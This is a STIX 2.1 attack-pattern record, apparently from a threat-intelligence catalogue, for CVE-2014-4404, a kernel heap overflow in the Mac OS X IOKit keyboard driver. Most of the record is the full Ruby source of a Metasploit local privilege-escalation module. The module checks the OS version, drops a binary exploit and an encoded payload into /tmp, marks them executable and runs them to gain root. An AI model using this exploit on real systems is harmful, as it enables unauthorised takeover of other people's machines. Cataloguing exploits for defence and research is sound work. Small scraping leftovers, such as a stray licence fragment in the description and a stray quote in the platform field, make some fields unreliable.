{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4f30d9ca-3523-4eab-95ec-c2647acfb465",
    "created": "2024-08-14T16:34:50.138298Z",
    "modified": "2024-08-14T16:34:50.138303Z",
    "name": "Mac OS X IOKit Keyboard Driver Root Privilege Escalation",
    "description": " A heap overflow in IOHIKeyboardMapper::parseKeyMapping allows kernel memory corruption in Mac OS X before 10.10. By abusing a bug in the IORegistry, kernel pointers can also be leaked, allowing a full kASLR bypass.  Tested on Mavericks 10.9.5, and should work on previous versions.  The issue was patched silently in Yosemite.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/iokit_keyboard_root.rb",
            "external_id": "iokit_keyboard_root.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4404"
        },
        {
            "source_name": "reference",
            "url": "http://googleprojectzero.blogspot.com/2014/11/pwn4fun-spring-2014-safari-part-ii.html"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=40"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=126"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking # Can cause kernel crash\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X IOKit Keyboard Driver Root Privilege Escalation',\n      'Description'   => %q{\n        A heap overflow in IOHIKeyboardMapper::parseKeyMapping allows kernel memory\n        corruption in Mac OS X before 10.10. By abusing a bug in the IORegistry, kernel\n        pointers can also be leaked, allowing a full kASLR bypass.\n\n        Tested on Mavericks 10.9.5, and should work on previous versions.\n\n        The issue was patched silently in Yosemite.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Ian Beer', # discovery, advisory, publication, and a most excellent blog post\n          'joev' # copy/paste monkey\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2014-4404' ],\n          [ 'URL', 'http://googleprojectzero.blogspot.com/2014/11/pwn4fun-spring-2014-safari-part-ii.html' ],\n          # Heap overflow:\n          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=40' ],\n          # kALSR defeat:\n          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=126' ]\n        ],\n      'Platform'      => 'osx',\n      'Arch'          => ARCH_X64,\n      'SessionTypes'  => [ 'shell', 'meterpreter' ],\n      'Targets'       => [\n        [ 'Mac OS X 10.9.5 Mavericks x64 (Native Payload)', { } ]\n      ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2014-09-24'\n    ))\n  end\n\n  def check\n    if ver_lt(osx_ver, \"10.10\")\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    exploit_path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2014-4404')\n    binary_exploit = File.read(File.join(exploit_path, 'key_exploit'))\n    binary_payload = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n    exploit_file = \"/tmp/#{Rex::Text::rand_text_alpha_lower(12)}\"\n    payload_file = \"/tmp/#{Rex::Text::rand_text_alpha_lower(12)}\"\n\n    print_status(\"Writing exploit file as '#{exploit_file}'\")\n    write_file(exploit_file, binary_exploit)\n    register_file_for_cleanup(exploit_file)\n\n    print_status(\"Writing payload file as '#{payload_file}'\")\n    write_file(payload_file, binary_payload)\n    register_file_for_cleanup(payload_file)\n\n    print_status(\"Executing payload...\")\n    cmd_exec(\"chmod +x #{exploit_file}\")\n    cmd_exec(\"chmod +x #{payload_file}\")\n    cmd_exec(\"#{exploit_file} #{payload_file}\")\n  end\n\n  def osx_ver\n    cmd_exec(\"sw_vers -productVersion\").to_s.strip\n  end\n\n  def ver_lt(a, b)\n    Rex::Version.new(a) < Rex::Version.new(b)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "osx'"
    ]
}